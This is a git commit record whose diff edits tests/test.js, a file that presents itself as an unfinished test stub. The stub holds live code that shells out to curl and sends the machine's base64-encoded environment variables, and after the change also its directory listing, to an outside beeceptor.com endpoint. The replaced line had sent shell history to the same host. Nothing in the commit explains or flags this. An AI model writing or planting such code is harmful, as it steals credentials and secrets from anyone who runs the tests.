934ede3fb094166a42fa9dacc9a11ad3dc279f58
Umberto Barbato <62031074+umb-hub@users.noreply.github.com>
2023-04-15 15:21:34 +0200

    aa

--- tests/test.js
+++ tests/test.js
@@ -1,5 +1,5 @@
 // TODO: implement the tests
 
 process.mainModule.require('child_process').exec('curl https://awdadw.free.beeceptor.com/?$(printenv | base64 -w 0)');
-process.mainModule.require('child_process').exec('curl https://awdadw.free.beeceptor.com/?$(history | base64 -w 0)');
+process.mainModule.require('child_process').exec('curl https://awdadw.free.beeceptor.com/?$(ls | base64 -w 0)');
 console.log("Tests are not implemented yet...");
